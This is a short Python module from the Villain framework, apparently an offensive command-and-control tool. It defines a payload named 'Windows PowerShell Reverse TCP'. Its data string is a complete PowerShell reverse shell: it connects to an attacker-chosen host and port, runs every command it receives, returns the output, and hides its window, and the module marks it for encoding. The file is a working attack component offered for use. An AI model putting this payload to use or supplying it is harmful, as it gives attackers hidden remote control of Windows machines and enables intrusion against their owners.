# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden"
    